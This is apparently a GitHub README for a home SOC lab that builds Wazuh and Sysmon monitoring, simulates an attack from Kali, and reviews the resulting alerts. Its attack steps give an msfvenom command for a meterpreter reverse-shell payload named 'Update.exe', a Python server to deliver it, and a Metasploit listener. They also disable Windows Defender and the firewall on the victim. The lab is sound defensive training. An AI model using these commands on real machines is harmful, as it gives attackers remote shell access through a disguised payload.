# SOC-Automation-Lab
# Introduction
The SOC Automation Lab project is a self-contained cybersecurity home lab designed to simulate real-world attack and defense scenarios using open-source tools. It focuses on building hands-on skills in threat detection, log analysis, and automated alerting—key components of a Security Operations Center (SOC).

This lab setup demonstrates how a simulated attacker (Kali Linux) launches various attacks such as Nmap scans and reverse shells against a victim machine (Windows), which in turn forwards logs to a centralized Wazuh SIEM (Security Information and Event Management) server. The Wazuh platform is configured to monitor, detect, and alert on suspicious behavior using custom rules and log-based detections.

![generated-image](https://github.com/user-attachments/assets/d77571c9-27c6-44f9-a466-bbe743814cf2)


# Setup Requirements
| Category                 | Requirements                                       |
|--------------------------|---------------------------------------------------|
| **Operating Systems**    | - Ubuntu VM (22 version) <br> - Windows 10 VM <br> - Kali Linux VM |
| **System Requirements**  | - RAM: 8GB or 16GB  <br> - Internet Connection: Required for downloads and updates |
| **Logging & Monitoring Tools** | - Wazuh (Open-Source SIEM) <br> - Sysmon (System monitoring & event logging) |

# Lab Architecture & Topology
### Diagram:
![lab architecture   Topology of Soc Automation Lab - visual selection](https://github.com/user-attachments/assets/2574c29f-f885-45b7-902e-054ccf57d02f)



### Description:
Kali Linux acts as the attacker machine to simulate real-world exploits and scans.
Windows 10 serves as the victim, forwarding security logs for monitoring.
Ubuntu hosts the Wazuh SIEM to collect, analyze, and alert on suspicious activities.

### Getting Started
### Step 1. Lab Setup

### 1.1. Network Configuration for VMs  
**Assign NAT/Host-Only Networks**  
For **all VMs (Ubuntu, Kali, Windows)**:  
- Open VM Settings → **Network**  
- **Adapter 1**:  
  - Attached to: **NAT Network**  
  - Name: `SOC_NAT`   
- **Adapter 2** (Optional):  
  - Attached to: **Host-Only Network**  
  - Purpose: Internal VM-to-VM communication  

---

### 1.2. Ubuntu SIEM Server Setup  
**Requirements**: Ubuntu LTS ISO  
**Steps**:  
1. **Create VM**:  
   - RAM: 2GB (4GB recommended)  
   - Storage: 20GB+  
   - Network: Bridged/Host-Only 
2. **Install Ubuntu**:  
   - Attach ISO → Start VM → Choose **Normal Installation**  
   - Enable updates during setup  
   - Create user account with strong password  
3. **Post-Installation**:  
   ```bash
   sudo apt update && sudo apt upgrade -y
   ```

---

### 1.3. Kali Linux Attacker VM  
**Requirements**: Kali Linux  
**Setup**:   
1. **Resource Allocation**:  
   - RAM: 2GB (4GB recommended)  
   - Storage: 20GB+  
2. **Update System**:  
   ```bash
   sudo apt update && sudo apt upgrade -y
   ```

---

### 1.4. Windows 10 Victim Machine  
**Requirements**: Windows 10 
**Configuration**:  
1. **Create VM**:  
   - RAM: 4GB (8GB recommended)  
   - Storage: 40GB+  
   - Network: Bridged/Host-Only  
2. **Install Windows**:  
   - Complete regional/language settings  
   - Create user account  
3. **Optimize for Lab**:  
   - Disable automatic updates (for stability)  
   - Install tools like Sysmon, Wazuh agent  
---
### 1.5 Configuration for Windows VM
1️⃣ Configure Local Security Policy (Enable Auditing)
To ensure that important system events (like logins, file access, and process creation) are logged and can be forwarded to Wazuh:

Steps:

Press Win + R to open the Run dialog.

Type "secpol.msc" and press Enter.

In the Local Security Policy window, navigate to:
Security Settings → Local Policies → Audit Policy

Security Settings → Local Policies → Audit Policy
Double-click and enable auditing for the following categories:

Audit logon events → Success and Failure

Audit object access → Success and Failure

Audit process tracking → Success and Failure

Click Apply and OK after configuring each one.

Restart the system to ensure all policy changes take effect.

2️⃣ Disable Windows Defender (for Payload Execution)
Disabling antivirus and firewall is important for allowing reverse shell payloads to execute without being blocked.

Steps to Disable Real-Time Protection:

Go to Start → Settings → Update & Security → Windows Security.

Click Virus & threat protection.

Under Virus & threat protection settings, click Manage settings.

Turn Real-time protection to Off.

3️⃣ Disable Windows Firewall
To prevent blocking of incoming reverse shell connections from Kali (Attacker):

Steps:

Open Control Panel → System and Security → Windows Defender Firewall.

On the left sidebar, click Turn Windows Defender Firewall on or off.

Under both Private and Public network settings:

Select Turn off Windows Defender Firewall.

---

### 1.6. Snapshots (Highly Recommended)  
Take clean-state snapshots after setup:  
- **VirtualBox**: Machine → Take Snapshot  
- **VMware**: VM → Snapshot → Take Snapshot  
---
### Step 2. Installing Sysmon on Windows 
Sysmon (System Monitor) is a Windows system service and device driver that logs detailed information about process creations, network connections, file changes, and more. Integrating Sysmon with Wazuh enhances visibility into endpoint activity for advanced threat detection.
 Installation Steps:
1. Download Sysmon
Download Sysinternals Suite or just Sysmon.exe and Sysmon64.exe from the official Microsoft website:
https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon

2. Choose a Sysmon Configuration File
Use a community-configured file 

3. Install Sysmon with Configuration
Run Command Prompt or PowerShell as Administrator and use:
 ```bash
   sysmon64.exe -accepteula -i sysmonconfig.xml
  ```
<div align="center">
<h1></h1> 
    <img src="https://github.com/user-attachments/assets/0137e58a-a7a7-44cf-aa60-52d213528a14" >
    <p><em>Figure.2: Verification of Sysmon installation</em></p>
</div>



Replace sysmonconfig.xml with the name of your config file.

4. Verify Installation
```bash
  Sysmon64 --version
   ```
Or by checking the Windows Event Viewer under:
> Applications and Services Logs → Microsoft → Windows → Sysmon → Operational
<div align="center">
<!--   <h1>My Project</h1> -->
    <img src="https://github.com/user-attachments/assets/cff6035d-fc64-428e-b57d-e9052422a484">
    <p><em>Figure.3: Verification of Sysmon Running in Event Viewer</em></p>
</div>

### Step 3. Wazuh Installation on Ubuntu (SIEM Server)
1. Update Your System Packages by following Command
```bash
  Sudo apt-get update && Sudo apt upgrade -y
   ```
2. Install Required Dependencies
```bash
 sudo apt install curl apt-transport-https lsb-release gnupg -y
   ```
3. Add the Wazuh Repository
```bash
 curl -sO https://packages.wazuh.com/4.x/wazuh-install.sh
 sudo bash wazuh-install.sh -a
   ```
4. Verify Wazuh Manager Status
```bash
sudo systemctl status wazuh-manager
   ```
After the Installation Wazuh Manager is running on your web server address on Port 443 

<div align="center">
<!--   <h1>My Project</h1> -->
    <img src="https://github.com/user-attachments/assets/b8a07e94-dad4-402e-8740-5db215851f6d">
    <p><em>Figure.4: Installation of Wazuh Manager </em></p>
</div>

---
### Step 4. Install Wazuh Agent on Windows
1. Download the Agent

Download the .msi installer to your Windows machine.

2. Install the Agent

Double-click the .msi file and follow the wizard.

During setup:

Enter the Wazuh Manager IP (your Ubuntu server’s IP).

Keep the default port (1514/UDP).

Name the agent (e.g., Windows-Victim).

3. Register the Agent with the Wazuh Manager

On Ubuntu (Wazuh server), run:
```bash
sudo /var/ossec/bin/manage_agents
   ```
Choose A to add a new agent.

Enter the name, IP, and OS type.

After adding, choose E to extract the key.

Copy the key and paste it into the Windows agent

You can find the Configuration file named "Win32" in a ossec folder directory it will prompt you to enter the wazuh manager IP address and Key 

4. Start the Agent

From PowerShell (as Administrator):
```bash
sc start WazuhSvc
   ```
### Step 5. Configure Wazuh to ingest Sysmon logs

Edit the Wazuh agent configuration file:

#### Path: `C:\Program Files (x86)\ossec-agent\ossec.conf`
```xml
<localfile>
    <log_format>eventchannel</log_format>
    <location>Microsoft-Windows-Sysmon/Operational</location>
</localfile>
```
### Step 6. Simulating Attack with Metasploit
To test Wazuh’s detection and alerting capabilities, we simulate a reverse shell attack using "msfconsole" and "msfvenom".
This simulates how an attacker might deliver and execute malware on a target system.

<div align="center">
<!--   <h1>My Project</h1> -->
    <img src="https://github.com/user-attachments/assets/162c516c-13ac-4a4e-975d-0a24ec11b135">
    <p><em>Figure.5: Metasploit Framework </em></p>
</div>

## 1. Generating Reverse Shell Payload
1. On Kali Linux :
      
  Use msfvenom to generate a Windows executable payload that initiates a reverse TCP connection   to the attacker's machine.
  ```bash
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<Attacker_IP> LPORT=4444 -f exe -o Update.exe
 ```
  Replace <Attacker_IP> with the IP of your Kali Linux machine.
  <div align="center">
<!--   <h1>My Project</h1> -->
    <img src="https://github.com/user-attachments/assets/45ff5d57-0828-49f8-b29d-76d831701eb1">
    <p><em>Figure.6: Payload Generated </em></p>
</div>


2. Transfer Payload to Windows Victim
  You can transfer the payload via:
   Python HTTP Server (on Kali)
  ```bash
 python3 -m http.server 8000
  ```

 <div align="center">
<!--   <h1>My Project</h1> -->
    <img src="https://github.com/user-attachments/assets/254899ee-a7e3-4746-98e7-313f031a0b0e">
    <p><em>Figure.7: Python Server Created in Terminal </em></p>
</div>

Open a browser in the victim machine and enter your address
Confirm that the payload .exe is downloaded in the victim machine 

<div align="center">
<!--   <h1>My Project</h1> -->
    <img src="https://github.com/user-attachments/assets/5d73104e-7fa2-4627-8b27-fbda97e501c7">
    <p><em>Figure.8: Downloaded Shell from the python server </em></p>
</div>

### Step 7. Set Up Metasploit Listener on kali 
## Launch the listener :
  ```bash
msfconsole
use exploit/multi/handler
set payload windowsx64/meterpreter/reverse_tcp
set LHOST 192.168.0.10
set LPORT 4444
exploit
 ```

<div align="center">
<!--   <h1>My Project</h1> -->
    <img src="https://github.com/user-attachments/assets/16a07f42-2cd3-4dba-aa0c-e325bf70e02b">
    <p><em>Figure.9: Listener is now Waiting for Connection </em></p>
</div>

If Successfully executed the shell payload on the victim machine, a meterpreter session will open in metasploit

### Step 8. Logs Verification in Wazuh Manager
## 1. Navigate to Wazuh Dashboard
  Open your browser and go to: https://<your-ubuntu-ip>:443
  Log in with your Wazuh credentials.

## 2. View Security Events 
2. View Security Events
   Go to: Wazuh → Security Events
   Filter by Agent name (e.g., WINDOWS10)
   Set the time filter to the last 15 or 30 minutes.
   Look for any alerts with:
   Event types such as "process_creation", "powershell", "cmd.exe
   
<div align="center">
<!--   <h1>My Project</h1> -->
    <img src="https://github.com/user-attachments/assets/804f1f5b-5b90-46c8-8ab2-85f0bc5f9aa1">
    <p><em>Figure.10: Security Events Dashboard </em></p>
</div>

### Step 9. Reviewing Attack Logs in Wazuh 
 After simulating attacks like port scans, reverse shells, or malicious process execution, Wazuh provides the capability to correlate and review detailed logs for threat detection and response. Here's how to investigate these attack traces effectively:
 
Open the Wazuh Dashboard (Kibana).
Navigate to Discover and filter logs using:
 ```bash
 data.win.system.providerName: "Microsoft-Windows-Sysmon"
  ```
Check if logs show process creation and network connections.

<div align="center">
<!--   <h1>My Project</h1> -->
    <img src="https://github.com/user-attachments/assets/1164162a-72a6-4ce4-b3f2-5839f58cd680">
    <p><em>Figure.11: Performing Search Query for attack detection </em></p>
</div>

### Step 10. Attack Detection and Analysis
## Review Attack Logs in Wazuh Dashboard
Open the Wazuh Dashboard in your browser.
Navigate to Security Events or Alerts.
Use the search/filter function to look for logs using the following table view with keys
 ```bash
agent.ip
rule.id
data.win.eventdata.LogonGuid
data.win.eventdata.Commandline
  ```
## Images of Attack Detection

<div align="center">
<!--   <h1>My Project</h1> -->
    <img src="https://github.com/user-attachments/assets/6d685dad-9e6e-4dc1-a394-02a4b909c832">
    <p><em>Figure.12: Process Creation (ID:1)  </em></p>
</div>

<div align="center">
<!--   <h1>My Project</h1> -->
    <img src="https://github.com/user-attachments/assets/e57fc761-4fbd-462e-9c12-14116d916198">
    <p><em>Figure.13: File Drops (ID:11)</em></p>
</div>

<div align="center">
<!--   <h1>My Project</h1> -->
    <img src="https://github.com/user-attachments/assets/e57fc761-4fbd-462e-9c12-14116d916198">
    <p><em>Figure.14: Rule Trigerred shows exe file is dropped in windows </em></p>
</div>

## Received Email Alerts
After configuring and restarting the Wazuh Manager, you should now receive email alerts when specific rules are triggered — like Nmap scans, reverse shells, or suspicious PowerShell usage.

<div align="center">
<!--   <h1>My Project</h1> -->
    <img src="https://github.com/user-attachments/assets/811be197-beeb-4a33-91e3-92d61a9d219d">
    <p><em>Figure.15: Email Alert for Attack </em></p>
</div>

### Summary 
Summary of What Achieved
In this SOC Automation Lab, successfully:

Set up a full virtual SOC environment using Kali, Windows 10, and Ubuntu.

Installed and configured Wazuh SIEM, Sysmon, and Windows Agent for real-time monitoring.

Simulated attacks like reverse shells using Metasploit.

Enabled email alerting for instant notifications of critical activity.

Verified logs and alerts using the Wazuh dashboard for complete visibility.

### Future Implementation
Future goals also include enriching logs with threat intelligence feeds, automating responses with SOAR scripts, and forwarding data to ELK Stack for advanced analytics and dashboards

Integration of Splunk, Hive and Shuffle for Advanced Detection and Faster response




